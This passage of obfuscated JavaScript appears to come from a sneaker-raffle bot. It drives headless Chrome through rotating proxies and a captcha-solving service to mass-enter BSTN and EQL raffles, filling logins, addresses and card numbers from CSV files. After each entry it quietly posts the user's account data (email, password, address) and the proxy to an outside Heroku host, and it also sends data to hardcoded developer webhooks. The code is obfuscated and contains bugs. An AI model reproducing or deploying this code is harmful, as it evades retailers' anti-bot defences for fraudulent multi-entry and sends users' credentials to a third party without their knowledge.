                            }), await _0x505897(0x1388), await _0x4d5292['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4d5292['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x505897(0x1f4), console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4d5292['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x33e9c7 => _0x33e9c7['click']()), await _0x4d5292['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4d5292['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x505897(0x7d0), await _0x4d5292['waitForSelector']('#email-login'), await _0x4d5292['type']('#email-login', '' + _0x249166[_0x187b10]['Email']), await _0x505897(0xdac), await _0x4d5292['waitForSelector']('#password'), await _0x4d5292['type']('#password', '' + _0x249166[_0x187b10]['Password'], { 'delay': 0xe6 }), await _0x505897(0x157c);
                            try {
                                await _0x4d5292['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4d55e1 => _0x4d55e1['click']());
                            } catch {
                            }
                            try {
                                await _0x4d5292['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x53eb40) {
                            }
                            await _0x505897(0x3e8);
                            const _0xee6062 = await _0x4d5292['$']('.enteredDraw_container__2KmQ_');
                            if (_0xee6062)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x249166[_0x187b10]['Size']);
                            try {
                                if (_0x249166[_0x187b10]['Size'] != 'RANDOM') {
                                    var _0x3f643c = _0x249166[_0x187b10]['Size']['replace']('.', ',');
                                    const _0x4c244b = await _0x4d5292['$x']('//div[contains(text(),\x20' + _0x3f643c + ')]');
                                    await _0x4c244b[0x0]['click']();
                                } else {
                                    const _0x5838e0 = await _0x4d5292['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x346023 = Math['round'](Math['random']() * (_0x5838e0['length'] - 0x1));
                                    await _0x5838e0[_0x346023]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x505897(0x1f4);
                            const _0x404599 = await _0x4d5292['$']('.addressList_addressItem__LE2PB');
                            if (_0x404599 && _0x249166[_0x187b10]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x4d5292['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x505897(0x5dc), await _0x4d5292['waitForSelector']('#firstname'), await _0x4d5292['type']('#firstname', '' + _0x249166[_0x187b10]['FirstName']), await _0x505897(0x1f4), await _0x4d5292['waitForSelector']('#firstname'), await _0x4d5292['type']('#lastname', '' + _0x249166[_0x187b10]['LastName']), await _0x505897(0x1f4), await _0x4d5292['waitForSelector']('#firstname'), await _0x4d5292['type']('#street', '' + _0x249166[_0x187b10]['Address1']), await _0x505897(0x1f4), await _0x4d5292['waitForSelector']('#firstname'), await _0x4d5292['type']('#houseNumber', _0x249166[_0x187b10]['HouseNumber'] + '\x20' + _0x249166[_0x187b10]['Address2']), await _0x505897(0x1f4), await _0x4d5292['waitForSelector']('#firstname'), await _0x4d5292['select']('#country_code', '' + _0x249166[_0x187b10]['Country']), await _0x505897(0x1f4), await _0x4d5292['type']('#postcode', '' + _0x249166[_0x187b10]['Zip']), await _0x505897(0x1f4), await _0x4d5292['type']('#city', '' + _0x249166[_0x187b10]['City']), await _0x505897(0x1f4), await _0x4d5292['type']('#telephone', '' + _0x249166[_0x187b10]['Phone']), await _0x505897(0x1f4), await _0x4d5292['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x505897(0x9c4);
                            try {
                                await _0x4d5292['type']('#instagram_name', '' + _0x249166[_0x187b10]['Follower']), await _0x4d5292['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x505897(0x5dc);
                            try {
                                await _0x4d5292['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x505897(0x5dc), await _0x4d5292['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xcc7916 => _0xcc7916['click']()), await _0x505897(0x1388);
                            try {
                                await _0x4d5292['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x4d5292['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x249166[_0x187b10]['Size'] != 'RANDOM') {
                                    var _0x3f643c = _0x249166[_0x187b10]['Size']['replace']('.', ',');
                                    const _0x526b09 = await _0x4d5292['$x']('//div[contains(text(),\x20' + _0x3f643c + ')]');
                                    await _0x526b09[0x0]['click']();
                                } else {
                                    const _0x161415 = await _0x4d5292['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x346023 = Math['round'](Math['random']() * (_0x161415['length'] - 0x1));
                                    await _0x161415[_0x346023]['click']();
                                }
                                await _0x505897(0x5dc);
                                try {
                                    await _0x4d5292['hover']('#instagram_name'), await _0x4d5292['type']('#instagram_name', '' + _0x249166[_0x187b10]['Follower']), await _0x4d5292['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Retrying\x20(' + _0x225d41 + '\x20/\x205)');
                                try {
                                    await _0x4d5292['hover']('.checkBox_boxHolder__wLGVe'), await _0x505897(0x5dc), await _0x4d5292['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x505897(0x157c), await _0x4d5292['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x36d32e => _0x36d32e['click']()), await _0x505897(0x1388), await _0x4d5292['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x3091e1 = 'no', _0x11df74(_0x249166[_0x187b10], _0x29e13e);
                            try {
                                prxdata = {
                                    'username': _0xdaef84['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x4998f6),
                                    'proxy': '' + _0x45c49f[_0x187b10]
                                };
                                var _0x3d17f8 = JSON['stringify'](prxdata);
                                let _0x308607 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x3d17f8, _0x308607);
                            } catch (_0xcdce3d) {
                            }
                            console['log'](_0x4e59da['green'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x1b7f10 = await _0x429bf8(_0x249166[_0x187b10], _0x29e13e, 'dev', ![]), _0x450781 = await _0x429bf8(_0x249166[_0x187b10], _0x29e13e, 'pub', ![]);
                            const _0x5d0bee = {
                                'succesDEVMSG': { 'embeds': [_0x1b7f10] },
                                'succesPUBMSG': { 'embeds': [_0x450781] }
                            };
                            let _0x4998f6 = _0x249166[_0x187b10];
                            try {
                                prxdata = {
                                    'username': _0xdaef84['replace']('#', ''),
                                    'module': _0x29e13e['name'],
                                    'entrydata': JSON['stringify'](_0x4998f6),
                                    'proxy': '' + _0x45c49f[_0x187b10]
                                };
                                var _0x3d17f8 = JSON['stringify'](prxdata);
                                let _0x49c96c = { 'headers': { 'content-type': 'application/json' } };
                                await _0x577975['post']('https://jraffles.herokuapp.com/success', _0x3d17f8, _0x49c96c);
                            } catch (_0x1b2f7a) {
                            }
                            try {
                                _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x5d0bee['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x5640fd, _0x5d0bee['succesDEVMSG']), await _0x505897(0xc8), await _0x1abce0(_0x1b595f, _0x5d0bee['succesPUBMSG']);
                            } catch (_0x2ee7d5) {
                                console['log'](_0x4e59da['yellow'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2ee7d5));
                            }
                        } catch (_0xbd1ddc) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20' + _0xbd1ddc)), _0x3091e1 = 'yes', _0x4058a2 = '' + _0xbd1ddc;
                            var _0x271350 = await _0x429bf8(_0x249166[_0x187b10], _0x29e13e, 'dev', !![], _0x4058a2), _0x1b7f10 = await _0x429bf8(_0x249166[_0x187b10], _0x29e13e, 'dev', ![]), _0x450781 = await _0x429bf8(_0x249166[_0x187b10], _0x29e13e, 'pub', ![]);
                            const _0x864880 = {
                                'succesDEVMSG': { 'embeds': [_0x1b7f10] },
                                'succesPUBMSG': { 'embeds': [_0x450781] }
                            };
                            _0x864880['errorDEV'] = { 'embeds': [_0x271350] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x864880['errorDEV']), await _0x1abce0(_0x3b044a, _0x864880['errorDEV']);
                        } finally {
                            _0x3e42df['close']();
                            if (_0x3091e1 == 'yes' && _0x225d41 != 0x5) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Task\x20' + (_0x187b10 + 0x1) + '\x20:\x20Retrying\x20(' + _0x225d41 + '\x20/\x205)')), _0x187b10 = _0x187b10 - 0x1, _0x225d41 = _0x225d41 + 0x1;
                                continue;
                            }
                            _0x3091e1 == 'yes' && _0x225d41 >= 0x5 && (_0x260c2d(_0x249166[_0x187b10], _0x29e13e), _0x3091e1 = 'no', _0x225d41 = 0x0), console['log'](_0x3b5c2b() + '\x20[' + _0x29e13e['name'] + ']\x20Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x259c8d, _0x5eb5ce) {
                    _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4acd48['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x2570ae;
                    try {
                        const _0x547620 = _0x5d8933['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x2570ae = _0x4d4612['parse'](_0x547620, { 'header': !![] })['data'];
                    } catch (_0x29618f) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x451b94 = 0x0; _0x451b94 < _0x2570ae['length']; _0x451b94++) {
                        if (_0x43260e != 'yes')
                            var _0x43260e = '', _0x3397d1 = 0x0;
                        var _0x33d79c;
                        _0x4041fe(_0x259c8d['name'] + '\x20Task\x20' + (_0x451b94 + 0x1) + '\x20/\x20' + _0x2570ae['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                        var _0x5e211e = await _0x429bf8(_0x2570ae[_0x451b94], _0x259c8d, 'acc', ![]);
                        const _0x24c20c = { 'succesDEVMSG': { 'embeds': [_0x5e211e] } }, _0x3b649e = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x111bad = Math['round'](Math['random']() * (_0x5eb5ce['length'] - 0x1)), _0x351ca4 = _0x5eb5ce[_0x111bad]['split'](':'), _0x3401d6;
                        try {
                            _0x3401d6 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x351ca4[0x0] + ':' + _0x351ca4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3401d6 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x351ca4[0x0] + ':' + _0x351ca4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1df565 = await _0x3401d6['newPage']();
                            await _0x1df565['authenticate']({
                                'username': '' + _0x351ca4[0x2],
                                'password': '' + _0x351ca4[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Task\x20' + (_0x451b94 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1df565['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1df565['setRequestInterception'](!![]), _0x1df565['on']('request', _0x5755e2 => {
                                _0x5755e2['resourceType']() === 'image' ? _0x5755e2['abort']() : _0x5755e2['continue']();
                            });
                            try {
                                await _0x1df565['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x1df565['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x43260e = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x1df565['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Task\x20' + (_0x451b94 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x505897(0x3e8), await _0x1df565['type']('#email', _0x2570ae[_0x451b94]['Email']), await _0x505897(0x1f4), await _0x1df565['type']('#pass', _0x2570ae[_0x451b94]['Password']), await _0x505897(0x1f4), await _0x1df565['$eval']('#login-form', _0x14201e => _0x14201e['submit']());
                            try {
                                await _0x1df565['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Task\x20' + (_0x451b94 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x505897(0x190);
                            const _0x34595d = await _0x1df565['evaluate'](() => {
                                const _0xe78bfa = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0xe78bfa['map'](_0xe63eb3 => _0xe63eb3['alt']);
                            }), _0x14a0af = await _0x1df565['evaluate'](() => {
                                const _0x25fda9 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x25fda9['map'](_0x3048eb => _0x3048eb['innerHTML']);
                            }), _0x200290 = await _0x1df565['$$']('.raffle-winner');
                            if (_0x200290['length'] < 0x1) {
                                console['log'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Task\x20' + (_0x451b94 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x43260e = 'no';
                                continue;
                            }
                            console['log'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Task\x20' + (_0x451b94 + 0x1) + '\x20:\x20' + _0x200290['length'] + '\x20Wins\x20Found!');
                            for (var _0x496571 = 0x0; _0x496571 < _0x200290['length']; _0x496571++) {
                                console['log'](_0x4e59da['green'](_0x34595d[_0x496571] + _0x14a0af[_0x496571]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x396b7c) {
                            console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Task\x20' + (_0x451b94 + 0x1) + '\x20:\x20' + _0x396b7c)), _0x33d79c = '' + _0x396b7c;
                            var _0x459b4a = await _0x429bf8(_0x2570ae[_0x451b94], _0x259c8d, 'acc', !![], _0x33d79c);
                            _0x24c20c['errorDEV'] = { 'embeds': [_0x459b4a] }, _0x4acd48['webhook'] != undefined && _0x4acd48['webhook'] != '' && await _0x1abce0(_0x4acd48['webhook'], _0x24c20c['errorDEV']), await _0x1abce0(_0x3b044a, _0x24c20c['errorDEV']), _0x43260e = 'yes';
                        } finally {
                            if (_0x3401d6)
                                _0x3401d6['close']();
                            if (_0x43260e == 'yes' && _0x3397d1 != 0x5) {
                                console['log'](_0x4e59da['red'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Task\x20' + (_0x451b94 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3397d1 + '\x20/\x205)')), _0x451b94 = _0x451b94 - 0x1, _0x3397d1 = _0x3397d1 + 0x1;
                                continue;
                            }
                            _0x43260e == 'yes' && _0x3397d1 >= 0x5 && (_0x260c2d(_0x2570ae[_0x451b94], _0x259c8d), _0x43260e = 'no', _0x3397d1 = 0x0), console['log'](_0x3b5c2b() + '\x20[' + _0x259c8d['name'] + ']\x20Waiting\x20for\x20' + _0x4acd48['delay'] + '\x20ms'), await _0x505897(_0x4acd48['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x38d49e, _0x2fb054, _0x5186e1) {
                _0x367f42['use'](_0x156bf2()), _0x367f42['use'](_0x5ad8e2({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4acd48['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3030d2 = 0x0; _0x3030d2 < _0x2fb054['length']; _0x3030d2++) {
                    var _0x1b585b;
                    _0x4041fe(_0x38d49e['name'] + '\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20/\x20' + _0x2fb054['length'] + '\x20||\x20File:\x20' + _0x22c4ed + '\x20Proxies:\x20' + _0x5a9fd8);
                    try {
                        await _0x43797b(_0x2fb054, _0x3030d2);
                    } catch {
                        _0x18382f = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x3f65de(_0x3edc8f) {
                        const _0x30686b = _0x5d8933['readFileSync']('../successful-tasks.csv', 'utf8'), _0x33541b = _0x4d4612['parse'](_0x30686b, { 'header': !![] })['data'];
                        let _0x8301ec = ![];
                        for (var _0x3f014d of _0x33541b) {
                            if (_0x3f014d['Url'] == _0x3edc8f['Url'] && _0x3f014d['Email'] == _0x3edc8f['Email']) {
                                _0x8301ec = !![];
                                break;
                            }
                        }
                        return _0x8301ec;
                    }
                    if (await _0x3f65de(_0x2fb054[_0x3030d2]) == !![]) {
                        console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x45e3f3 = ![];
                    const _0x4cc155 = _0x5d8933['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x7c6d66 = _0x4d4612['parse'](_0x4cc155, { 'header': !![] })['data'];
                    for (var _0x3b2415 of _0x7c6d66) {
                        _0x3b2415['Email'] == _0x2fb054[_0x3030d2]['Email'] && (_0x45e3f3 = !![]);
                    }
                    if (_0x45e3f3 == ![]) {
                        var _0x3cd956;
                        if (_0x2fb054[_0x3030d2]['Url']['endsWith']('/')) {
                            _0x3cd956 = _0x2fb054[_0x3030d2]['Url'] + 'register';
                            if (_0x18382f != 'yes')
                                var _0x18382f = '', _0x480a0a = 0x0;
                        } else {
                            _0x3cd956 = _0x2fb054[_0x3030d2]['Url'] + '/register';
                            if (_0x18382f != 'yes')
                                var _0x18382f = '', _0x480a0a = 0x0;
                        }
                        if (_0x2fb054[_0x3030d2]['Email'] == '' || _0x2fb054[_0x3030d2]['FirstName'] == '' || _0x2fb054[_0x3030d2]['LastName'] == '') {
                            console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2fb054[_0x3030d2]['Password'] == '' && (_0x2fb054[_0x3030d2]['Password'] = 'JRaffles23!');
                        if (_0x4acd48['useRandomProxy'] = ![])
                            var _0x16ceab = _0x5186e1[_0x3030d2]['split'](':');
                        else
                            var _0x864610 = Math['round'](Math['random']() * (_0x5186e1['length'] - 0x1)), _0x16ceab = _0x5186e1[_0x864610]['split'](':');
                        var _0x3c5e83;
                        try {
                            _0x3c5e83 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x16ceab[0x0] + ':' + _0x16ceab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3c5e83 = await _0x367f42['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x16ceab[0x0] + ':' + _0x16ceab[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1af624 = await _0x3c5e83['newPage']();
                            await _0x1af624['authenticate']({
                                'username': '' + _0x16ceab[0x2],
                                'password': '' + _0x16ceab[0x3]
                            }), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1af624['setRequestInterception'](!![]), _0x1af624['on']('request', _0x45098f => {
                                _0x45098f['resourceType']() === 'image' || _0x45098f['resourceType']() === 'font' || _0x45098f['resourceType']() === 'media' ? _0x45098f['abort']() : _0x45098f['continue']();
                            });
                            try {
                                await _0x1af624['goto'](_0x3cd956);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x505897(0x3e8), await _0x1af624['waitForSelector']('#email'), await _0x1af624['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x505897(0x3e8);
                            try {
                                await _0x1af624['click']('li[data-value=\x22EU\x20' + _0x2fb054[_0x3030d2]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x2fb054[_0x3030d2]['Size']);
                            }
                            await _0x505897(0x6a4), await _0x1af624['type']('#email', '' + _0x2fb054[_0x3030d2]['Email']), await _0x505897(0x352), await _0x1af624['waitForSelector']('#password'), await _0x1af624['type']('#password', '' + _0x2fb054[_0x3030d2]['Password']), await _0x505897(0x352), await _0x1af624['type']('#phone', '' + _0x2fb054[_0x3030d2]['Phone']), await _0x505897(0x352), await _0x1af624['type']('#firstName', '' + _0x2fb054[_0x3030d2]['FirstName']), await _0x505897(0x352), await _0x1af624['type']('#lastName', '' + _0x2fb054[_0x3030d2]['LastName']), await _0x505897(0x352);
                            _0x2fb054[_0x3030d2]['Url']['includes']('footlocker.de') ? await _0x1af624['type']('#birthdate', _0x85b9a6(0x1, 0x1c) + '.' + _0x85b9a6(0x1, 0xc) + '.' + _0x85b9a6(0x7c6, 0x7d3)) : await _0x1af624['type']('#birthdate', _0x85b9a6(0x1, 0x1c) + '-' + _0x85b9a6(0x1, 0xc) + '-' + _0x85b9a6(0x7c6, 0x7d3));
                            await _0x505897(0x352), await _0x1af624['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x1af624['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x505897(0x1f4), await _0x1af624['click']('#stateAutocomplete'), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x505897(0x1f4);
                            try {
                                const _0x207404 = await _0x1af624['$x']('//li[text()=\x22' + _0x2fb054[_0x3030d2]['State'] + '\x22]');
                                await _0x207404[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0x505897(0x3e8), await _0x505897(0x1f4), await _0x1af624['type']('#address1', _0x2fb054[_0x3030d2]['Address1'] + '\x20' + _0x2fb054[_0x3030d2]['HouseNumber']), await _0x505897(0x1f4), await _0x1af624['type']('#address2', '' + _0x2fb054[_0x3030d2]['Address2']), await _0x505897(0x1f4), await _0x1af624['type']('#city', '' + _0x2fb054[_0x3030d2]['City']), await _0x505897(0x1f4), await _0x1af624['type']('#postcode', '' + _0x2fb054[_0x3030d2]['Zip']), await _0x505897(0x3e8), await _0x1af624['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x505897(0x3e8), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            try {
                                await _0x1af624['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]');
                            } catch {
                                throw new Error('No\x20Payment\x20Token\x20Found');
                            }
                            await _0x505897(0x7d0), await _0x1af624['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x505897(0x12c), await _0x1af624['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x505897(0x4b0), await _0x1af624['keyboard']['type']('' + _0x2fb054[_0x3030d2]['CardNumber']), await _0x505897(0x320), await _0x1af624['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1af624['keyboard']['type']('' + _0x2fb054[_0x3030d2]['ExpiryDate']), await _0x505897(0x4b0), await _0x1af624['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1af624['keyboard']['type']('' + _0x2fb054[_0x3030d2]['CVV']), await _0x505897(0x226), await _0x1af624['type']('input[name=\x22postalCode\x22]', '' + _0x2fb054[_0x3030d2]['Zip']), await _0x505897(0x226), await _0x1af624['click']('#paymentConsent'), await _0x505897(0x226), await _0x1af624['click']('#termsConsent'), await _0x505897(0x2bc), console['log'](_0x3b5c2b() + '\x20[' + _0x38d49e['name'] + ']\x20Task\x20' + (_0x3030d2 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x1af624['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x505897(0x2710);
                            try {
                                await _0x1af624['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x505897(0xbb8), await _0x1af624['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5015cb => _0x5015cb['click']()), await _0x1af624['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2360fe => _0x2360fe['click']());
                            } catch {
                            }
                            try {
                                await _0x1af624['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x3d505d = await _0x1af624['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x3d505d) {
                                    _0x5d8933['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2fb054[_0x3030d2]['Email'] + ',' + _0x2fb054[_0x3030d2]['Password'] + ',' + _0x2fb054[_0x3030d2]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x3b31fb() {
                                var _0x3c276b, _0x35cfca = ![];
                                for (var _0x2e6458 = 0x0; _0x2e6458 < 0x18; _0x2e6458++) {
                                    async function _0x519387() {
                                        var _0x16bb1b = new _0x196441({
                                            'user': _0x4acd48['masterMail'],
                                            'password': _0x4acd48['masterPassword'],
